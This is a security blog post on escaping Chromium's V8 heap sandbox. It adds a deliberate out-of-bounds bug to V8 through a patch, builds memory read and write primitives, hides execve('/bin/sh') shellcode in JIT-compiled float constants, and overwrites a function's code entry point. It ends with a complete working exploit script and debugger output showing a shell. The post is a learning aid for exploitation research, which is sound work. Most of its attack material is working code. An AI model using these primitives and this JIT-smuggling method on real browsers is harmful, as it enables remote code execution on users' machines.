+++
tags = ["browser","v8","chromium"]
categories = ["Web Browsers", "Javascript Engines", "Chromium"]
description = "The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution, new methods have risen to take their place."
date = "2022-11-27"
featuredpath = "date"
linktitle = ""
title = "Code Execution in Chromium's V8 Heap Sandbox"
slug = "code-execution-in-chromiums-v8-heap-sandbox"
type = "post"
+++

## Overview

The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution, new methods have risen to take their place.

I thought it would be worthwile to detail one such method in an article. I've seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained. This is mostly for my own reference, but anyone is welcome to learn from it.


## Introducing the Heap Sandbox

First introduced into V8 around a year ago (at the time of this post), the motivation behind the implementation of the heap sandbox was to limit an attacker's ability to write data outside of V8's heap address-space.

It primarily performs this through the isolation of all external pointers and references to off-heap objects (e.g. the backing store of an ArrayBuffer object). In the heap sandbox, these pointers are converted to references to an external pointer table, essentially indices of a lookup table.

Memory corruption outside of V8's heap is considered to be an escape from this sandbox. That definition also covers arbitrary code execution.

## Escaping the Heap Sandbox

Now we move on to actually performing a heap sandbox escape. I've included a patch for a very, very, very simple array out-of-bounds vulnerability below. I'll be using that to demonstrate the technique.

Note: If you want to follow along, the commit hash for the build of V8 I'm using is `bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62`.

### An Example Vulnerability
As mentioned above, the vulnerability introduced here is very simple. A new JSArray builtin is added that allows you to change the length of an array to any arbitrary value, effectively providing you with out-of-bounds access below the array.

{{< highlight diff >}}
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 49fe48d698..2944eb9edb 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -395,6 +395,25 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
 
+BUILTIN(ArrayLen) {
+  uint32_t len = args.length();
+  if(len != 2) return ReadOnlyRoots(isolate).undefined_value();
+
+  Handle<JSReceiver> receiver;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, receiver, Object::ToObject(isolate, args.receiver()));
+  Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+
+  Handle<Object> argLen;
+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+      isolate, argLen, Object::ToNumber(isolate, args.at<Object>(1)));
+  uint32_t newLen = static_cast<uint32_t>(argLen->Number());
+
+  auto raw = *array;
+  raw.set_length(Smi::FromInt(newLen));
+  return ReadOnlyRoots(isolate).undefined_value();
+}
+
 namespace {
 
 V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 859b5cee9a..a16a7d5ca1 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -392,6 +392,7 @@ namespace internal {
   CPP(ArrayPrototypeGroupToMap)                                                \
   /* ES6 #sec-array.prototype.push */                                          \
   CPP(ArrayPush)                                                               \
+  CPP(ArrayLen)                                                                \
   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
   /* ES6 #sec-array.prototype.shift */                                         \
   CPP(ArrayShift)                                                              \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 5888a5cdab..5d13eac799 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1880,6 +1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayPush:
       return t->cache_->kPositiveSafeInteger;
+    case Builtin::kArrayLen:
+      return Type::Receiver();
     case Builtin::kArrayPrototypeReverse:
     case Builtin::kArrayPrototypeSlice:
       return Type::Receiver();
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 7c7b917502..550b25d4ba 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -1808,6 +1808,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           0, false);
     SimpleInstallFunction(isolate_, proto, "push", Builtin::kArrayPrototypePush,
                           1, false);
+    SimpleInstallFunction(isolate_, proto, "len", Builtin::kArrayLen,
+                          2, false);
     SimpleInstallFunction(isolate_, proto, "reverse",
                           Builtin::kArrayPrototypeReverse, 0, false);
     SimpleInstallFunction(isolate_, proto, "shift",
{{< /highlight >}}

Here's some Javascript code that triggers this vulnerability. The `len` builtin is called, and sets the length of the array to the value of `1337`.
```js
let a = [1.1, 2.2];
a.len(1337);
%DebugPrint(a);
```

We can see in the debug information below, that while the array only has two elements the length of the array is `1337`, giving us unrestricted out-of-bounds access below it.
```
DebugPrint: 0x27ff0004b9c9: [JSArray]
 - map: 0x27ff0018e6bd <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x27ff0018e11d <JSArray[0]>
 - elements: 0x27ff0004b9b1 <FixedDoubleArray[2]> [PACKED_DOUBLE_ELEMENTS]
 - length: 1337
 - properties: 0x27ff00002259 <FixedArray[0]>
 - All own properties (excluding elements): {
    0x27ff00006551: [String] in ReadOnlySpace: #length: 0x27ff00144269 <AccessorInfo name= 0x27ff00006551 <String[6]: #length>, data= 0x27ff000023e1 <undefined>> (const accessor descriptor), location: descriptor
 }
 - elements: 0x27ff0004b9b1 <FixedDoubleArray[2]> {
           0: 1.1
           1: 2.2
 }
...
```

### A Few Exploit Primitives
I'm not going to go into too much detail here, as there are a lot of resources detailing common V8 exploit primitives. Plus if you're reading this I'm assuming you already know a little about V8 exploitation.

```js
var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);

/* converts a float to a 64-bit uint */
function ftoi(x) {
  fs[0] = x;
  return is[0];
}

/* converts a 64-bit uint to a float */
function itof(x) {
  is[0] = x;
  return fs[0];
}
```

```js
/* create an oob array */
let oob = [1.1];
oob.len(1337);

/* flt.elements @ oob[6] */
let flt = [1.1];

/* obj.elements @ oob[15] */
let tmp = {a: 1};
let obj = [tmp];

/* addrof primitive */
function addrof(o) {
  oob[6] = oob[15]; 
  obj[0] = o;
  return (ftoi(flt[0]) & 0xffffffffn) - 1n;
}

/* 64-bit read primitive */
function read(p) {
  let a = ftoi(oob[6]) >> 32n;
  oob[6] = itof((a << 32n) + p - 8n + 1n);
  return ftoi(flt[0]);
}

/* 64-bit write primitive */
function write(p, x) {
  let a = ftoi(oob[6]) >> 32n;
  oob[6] = itof((a << 32n) + p - 8n + 1n);
  flt[0] = itof(x);
}
```

### Redirecting Code Execution
Now we can finally move on to the interesting part! How, given that we are in this heap sandbox, can we redirect code execution? Not necessarily to a place we control, but just to any arbitrary location.

Well, maybe it's possible to corrupt a Function object. We can start by creating a function `foo` and printing it's debug information in order to dig around in memory.
```js
const foo = () => {
  return;
}

%DebugPrint(foo);
%SystemBreak();

foo();
```

In the debug information below, we can see that the Function object holds a pointer to some `code` object at an offset of `0x18`. This is where the code metadata must be stored.

We can print this object in gdb using the `job` command (provided the V8 config is in `.gdbinit`).
```
DebugPrint: 0x31df0004b9cd: [Function]
 - map: 0x31df00184241 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x31df001840f5 <JSFunction (sfi = 0x31df00145df5)>
 - elements: 0x31df00002259 <FixedArray[0]> [HOLEY_ELEMENTS]
 - function prototype: <no-prototype-slot>
 - shared_info: 0x31df00199f41 <SharedFunctionInfo foo>
 - name: 0x31df00199ea5 <String[3]: #foo>
 - builtin: CompileLazy
 - formal_parameter_count: 0
 - kind: ArrowFunction
 - context: 0x31df0019a015 <ScriptContext[3]>
 - code: 0x31df001467e5 <CodeDataContainer BUILTIN CompileLazy>
 - source code: () => {
  return;
}
...
```

There's a code entry point field stored at an offset of `0xc`, and sure enough it's an external address. Viewing the memory at this object's location it shows that this external pointer is stored in the object itself - it's not an index to the external pointer table.

This means we should be able to overwrite it and redirect code execution to an arbitrary address when this `foo` function is called.
```
pwndbg> job 0x31df001467e5
0x31df001467e5: [CodeDataContainer] in OldSpace
 - map: 0x31df00002a71 <Map[28](CODE_DATA_CONTAINER_TYPE)>
 - kind: BUILTIN
 - builtin: CompileLazy
 - is_off_heap_trampoline: 1
 - code: 0
 - code_entry_point: 0x55f3898c21c0
 - kind_specific_flags: 0
pwndbg> x/4gx 0x31df001467e5-1
0x31df001467e4:	0x000023e100002a71	0x898c21c000000000
0x31df001467f4:	0x00590032000055f3	0x00002a7100000000
pwndbg> x/gx 0x31df001467e5-1+0xc
0x31df001467f0:	0x000055f3898c21c0
```

Replacing the `code_entry_point` pointer with the value `0x6161616161616161` and continuing in gdb proves the above theory. We've managed to redirect code execution to an arbitrary address.
```
pwndbg> set *(int64_t *)(0x31df001467e5-1+0xc) = 0x6161616161616161
pwndbg> job 0x31df001467e5
0x31df001467e5: [CodeDataContainer] in OldSpace
 - map: 0x31df00002a71 <Map[28](CODE_DATA_CONTAINER_TYPE)>
 - kind: BUILTIN
 - builtin: CompileLazy
 - is_off_heap_trampoline: 1
 - code: 0
 - code_entry_point: 0x6161616161616161
 - kind_specific_flags: 0
pwndbg> c
...
 ► 0x55f3898b6c5f <Builtins_CallFunction_ReceiverIsAny+287> jmp rcx <0x6161616161616161>
```

### 3.4. Writing Shellcode
There's just one more thing we need before we can get arbitrary code execution. We just need to find a way to write some shellcode to executable memory.

This is an interesting problem, especially since we can no longer write data outside of the heap via an ArrayBuffer object due to the heap sandbox, and since the previously very useful wasm `rwx` page is outside the sandbox.

This is actually solved fairly easily, because TurboFan JIT compiles immediate numbers (such as floats) into `movabs <reg>, <val>` instructions - we can use this to place small pockets of shellcode in executable memory.

Let's force TurboFan to compile a function that returns an array of floats. 
```js
const foo = () => {
  return [1.1, 2.2, 3.3, 4.4];
}

%PrepareFunctionForOptimization(foo);
foo();
%OptimizeFunctionOnNextCall(foo);
foo();

%DebugPrint(foo);
%SystemBreak();
```

One interesting thing to note is that the CodeDataContainer object has changed from a `BUILTIN CompileLazy` object to a `TURBOFAN` object. It's pretty clear that TurboFan has compiled this function.
```
DebugPrint: 0x301d0004ba31: [Function]
 - map: 0x301d00184241 <Map[28](HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x301d001840f5 <JSFunction (sfi = 0x301d00145df5)>
 - elements: 0x301d00002259 <FixedArray[0]> [HOLEY_ELEMENTS]
 - function prototype: <no-prototype-slot>
 - shared_info: 0x301d00199f95 <SharedFunctionInfo foo>
 - name: 0x301d00199ea5 <String[3]: #foo>
 - formal_parameter_count: 0
 - kind: ArrowFunction
 - context: 0x301d0019a07d <ScriptContext[3]>
 - code: 0x301d0019a1fd <CodeDataContainer TURBOFAN>
 - source code: () => {
  return [1.1, 2.2, 3.3, 4.4];
}
...
```

Viewing the instructions stored at the code entry point we can see that our immediate numbers have all been compiled to `movabs r10, <val>` instructions.

This is how we'll get arbitrary data into executable memory. The idea behind this technique is to chain these little pockets of controlled executable data into usable shellcode.
```
pwndbg> job 0x301d0019a1fd
0x301d0019a1fd: [CodeDataContainer] in OldSpace
 - map: 0x301d00002a71 <Map[28](CODE_DATA_CONTAINER_TYPE)>
 - kind: TURBOFAN
 - is_off_heap_trampoline: 0
 - code: 0x55cdc0004001 <Code TURBOFAN>
 - code_entry_point: 0x55cdc0004040
 - kind_specific_flags: 4
pwndbg> x/40i 0x55cdc0004040
...
   0x55cdc00040a7:	movabs r10,0x3ff199999999999a
   0x55cdc00040b1:	vmovq  xmm0,r10
   0x55cdc00040b6:	vmovsd QWORD PTR [rcx+0x7],xmm0
   0x55cdc00040bb:	movabs r10,0x400199999999999a
   0x55cdc00040c5:	vmovq  xmm0,r10
   0x55cdc00040ca:	vmovsd QWORD PTR [rcx+0xf],xmm0
   0x55cdc00040cf:	movabs r10,0x400a666666666666
   0x55cdc00040d9:	vmovq  xmm0,r10
   0x55cdc00040de:	vmovsd QWORD PTR [rcx+0x17],xmm0
   0x55cdc00040e3:	movabs r10,0x401199999999999a
...
```

Here's a little python script that will help us generate an `execve("/bin/sh", 0, 0)` shellcode. Take particular note of the `jmp 0xe` instruction appended to each chunk of shellcode. This will chain each section of shellcode to the next.
```py
#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'


def convert(x):
    print(len(x))
    jmp = b'\xeb\x0c' # jmp 0xe
    return u64(x.ljust(6, b'\x90') + jmp)


imm = [
    asm('push SYS_execve; pop rax'),
    asm('push 0x0068732f; pop rbx'), # "/sh\0"
    asm('push 0x6e69622f; pop rcx'), # "/bin"
    asm('shl rbx, 0x20'),
    asm('add rbx, rcx; push rbx'),
    asm('mov rdi, rsp'),
    asm('xor rsi, rsi; xor rdx, rdx'),
    asm('syscall')
]

imm = [convert(x) for x in imm]
log.info(f'{imm}')

"""
[
    930996698553531242,
    930937805292646248,
    930936078731456360,
    930996696683626824,
    930996697537642824,
    930996698562922824,
    931068857101463880,
    930996698557187343
]
"""
```

We'll also need a some Javascript code to convert these integers into their float representation, in order for them to be compiled into usable shellcode.
```js
var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);

/* converts a 64-bit uint to a float */
function itof(x) {
  is[0] = x;
  return fs[0];
}

let x = [
  930996698553531242n,
  930937805292646248n,
  930936078731456360n,
  930996696683626824n,
  930996697537642824n,
  930996698562922824n,
  931068857101463880n,
  930996698557187343n
];

for (let i = 0; i < x.length; i++)
  console.log(itof(x[i]));

/*
[
  1.9711828979523134e-246,
  1.9562205631094693e-246,
  1.9557819155246427e-246,
  1.9711824228871598e-246,
  1.971182639857203e-246,
  1.9711829003383248e-246,
  1.9895153920223886e-246,
  1.971182898881177e-246
]
*/
```

### Executing Shellcode
Now we have everything we need in order to achieve code execution - both the ability to redirect process execution to an arbitrary address, and the ability to write shellcode to executable memory. 

The below Javascript code can help demonstrate this in its entirety. With the first step being to get TurboFan to compile our function with our "shellcode".
```js
/* execve("/bin/sh", 0, 0); */
const foo = () => {
  return [
    1.9711828979523134e-246,
    1.9562205631094693e-246,
    1.9557819155246427e-246,
    1.9711824228871598e-246,
    1.971182639857203e-246,
    1.9711829003383248e-246,
    1.9895153920223886e-246,
    1.971182898881177e-246
  ];
}

%PrepareFunctionForOptimization(foo);
foo();
%OptimizeFunctionOnNextCall(foo);
foo();

%DebugPrint(foo);
%SystemBreak();

foo();
```

Using gdb to print out the debug information for the code object, we can then disassemble the JITed `foo` function. The array of floats has been converted into `movabs r10, <val>` instructions, meaning the shellcode we need has been written to executable memory.
```
pwndbg> job 0x02930019a215
0x2930019a215: [CodeDataContainer] in OldSpace
 - map: 0x029300002a71 <Map[28](CODE_DATA_CONTAINER_TYPE)>
 - kind: TURBOFAN
 - is_off_heap_trampoline: 0
 - code: 0x562f80004001 <Code TURBOFAN>
 - code_entry_point: 0x562f80004040
 - kind_specific_flags: 4
pwndbg> x/40i 0x562f80004040
...
   0x562f800040a7:	movabs r10,0xceb909090583b6a
   0x562f800040b1:	vmovq  xmm0,r10
   0x562f800040b6:	vmovsd QWORD PTR [rcx+0x7],xmm0
   0x562f800040bb:	movabs r10,0xceb900068732f68
   0x562f800040c5:	vmovq  xmm0,r10
   0x562f800040ca:	vmovsd QWORD PTR [rcx+0xf],xmm0
   0x562f800040cf:	movabs r10,0xceb906e69622f68
   0x562f800040d9:	vmovq  xmm0,r10
   0x562f800040de:	vmovsd QWORD PTR [rcx+0x17],xmm0
   0x562f800040e3:	movabs r10,0xceb909090e78948
...
```

The below gdb output shows the start of the shellcode. All that's necessary at this point is to find the offset from the original function entry point to the start of our shellcode.

This is needed as we want to overwrite the pointer of the original entry point with a pointer to our shellcode. This will allow us to redirect process execution to our shellcode.
```
pwndbg> x/6i 0x562f800040a7+2
   0x562f800040a9:	push   0x3b
   0x562f800040ab:	pop    rax
   0x562f800040ac:	nop
   0x562f800040ad:	nop
   0x562f800040ae:	nop
   0x562f800040af:	jmp    0x562f800040bd
pwndbg> p/x (0x562f800040a7+2)-0x562f80004040
$1 = 0x69
```

```
pwndbg> set *(int64_t *)(0x02930019a215-1+0xc) = 0x562f80004040+0x69
pwndbg> job 0x02930019a215
0x02930019a215: [CodeDataContainer] in OldSpace
 - map: 0x029300002a71 <Map[28](CODE_DATA_CONTAINER_TYPE)>
 - kind: TURBOFAN
 - is_off_heap_trampoline: 0
 - code: 0x562f80004001 <Code TURBOFAN>
 - code_entry_point: 0x562f800040a9
 - kind_specific_flags: 4
...
pwndbg> c
Continuing.
[Thread 0x7f07a4162700 (LWP 288626) exited]
[Thread 0x7f07a4963700 (LWP 288625) exited]
[Thread 0x7f07a5164700 (LWP 288624) exited]
process 288620 is executing new program: /usr/bin/dash
$ id
```

### Building an Exploit
At this point we have the majority of building blocks necessary to build a working exploit. The only missing component necessary to complete it is the part that overwrites the `foo` function's entry point.

This is fairly trivial to implement, we find the address of the `foo` function using our addrof primtive, before reading the pointer to its code object (stored at an offset of 0x18) via our arbitrary read primitive.

We then use our arbitrary read primitive again, in order to find the pointer to the `foo` function's entry point (stored at an offset of 0xc). After this, we use our arbitrary write primitive to overwrite the entry point value to the start of our JITed shellcode.
```js
/* get a pointer to the foo.code object */
let code = (read(addrof(foo) + 0x18n) - 1n) & 0xffffffffn;

/* get the entry point of the compiled function */
let entry = (read(code + 0xcn));

/* overwrite the entry point with the start of the shellcode */
write(code + 0xcn, entry + 0x69n);

foo();
```

In the code below you can find the whole working exploit code. Note that some of the offsets in the primitives have changed - this was due to the `foo` function being placed above the arrays on the heap.
{{< highlight js >}}
var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);

/* converts a float to a 64-bit uint */
function ftoi(x) {
  fs[0] = x;
  return is[0];
}

/* converts a 64-bit uint to a float */
function itof(x) {
  is[0] = x;
  return fs[0];
}

/* execve("/bin/sh", 0, 0); */
const foo = () => {
  return [
    1.9711828979523134e-246,
    1.9562205631094693e-246,
    1.9557819155246427e-246,
    1.9711824228871598e-246,
    1.971182639857203e-246,
    1.9711829003383248e-246,
    1.9895153920223886e-246,
    1.971182898881177e-246
  ];
}

for (let i = 0; i < 0x40000; i++)
  foo();

/* create an oob array */
let oob = [1.1];
oob.len(1337);

/* flt.elements @ oob[6] */
let flt = [1.1];

/* obj.elements @ oob[15] */
let tmp = {a: 1};
let obj = [tmp];

/* addrof primitive */
function addrof(o) {
  oob[6] = oob[15]; 
  obj[0] = o;
  return (ftoi(flt[0]) & 0xffffffffn) - 1n;
}

/* 64-bit read primitive */
function read(p) {
  let a = ftoi(oob[6]) >> 32n;
  oob[6] = itof((a << 32n) + p - 8n + 1n);
  return ftoi(flt[0]);
}

/* 64-bit write primitive */
function write(p, x) {
  let a = ftoi(oob[6]) >> 32n;
  oob[6] = itof((a << 32n) + p - 8n + 1n);
  flt[0] = itof(x);
}

/* get a pointer to the foo.code object */
let code = (read(addrof(foo) + 0x18n) - 1n) & 0xffffffffn;

/* get the entry point of the compiled function */
let entry = (read(code + 0xcn));

/* overwrite the entry point with the start of the shellcode */
write(code + 0xcn, entry + 0x69n);

foo();
{{< /highlight >}}

One last thing to note, while this exploit technique does seem fairly stable, different kernel versions or platforms will affect the offsets of the immediate numbers in the JIT compiled code. 

This poses a slight problem as it significantly affects the reliability. Obviously techniques already exist to combat this issue - e.g. incrementing the offsets until the exploit executes successfully.

I do have some ideas I'd like to explore further around increasing exploit reliability - but those will come in another article.


## References 
 - [V8 Sandbox - High-Level Design Doc](https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8)
 - [V8 Sandbox - External Pointer Sandboxing](https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk)
 - [Dice CTF Memory Hole: Breaking V8 Heap Sandbox](https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html)

